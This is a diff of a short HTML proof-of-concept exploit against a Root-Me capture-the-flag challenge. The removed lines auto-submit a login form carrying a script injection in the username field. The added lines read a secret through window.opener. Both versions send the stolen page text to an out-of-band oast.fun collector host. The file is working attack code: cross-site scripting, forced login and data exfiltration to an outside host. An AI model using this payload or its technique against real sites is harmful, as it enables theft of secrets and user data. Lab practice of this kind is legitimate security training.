@@ -1,11 +1,19 @@
 <!DOCTYPE html>
-<html>
-  <body onload="document.forms[0].submit()">
-    <form action="http://challenge01.root-me.org:58003/login" method="POST">
-      <input type="hidden" name="username" value="<script>window.onload = function () { var secret = document.querySelector('u').parentElement.innerText; document.location = 'https://jrnhteacxragwsxmgdxlwnh0wn3hp1vx0.oast.fun/log?secret=' + encodeURIComponent(secret);}</script>">
-	  <input type="hidden" name="secret" value="nimportequoi">
-    </form>
-
-    <meta http-equiv="refresh" content="1;url=http://challenge01.root-me.org:58003/profile">
+<html lang="en">
+  <head>
+    <title>Opener POC</title>
+  </head>
+  <body>
+    <h1>Loading...</h1>
+    <script>
+      window.onload = function () {
+        try {
+          const secret = window.opener.document.querySelector("u").parentElement.innerText;
+          fetch("https://jrnhteacxragwsxmgdxlwnh0wn3hp1vx0.oast.fun?data=" + encodeURIComponent(secret));
+        } catch (e) {
+          fetch("https://jrnhteacxragwsxmgdxlwnh0wn3hp1vx0.oast.fun?error=" + encodeURIComponent(e.message));
+        }
+      };
+    </script>
   </body>
 </html>
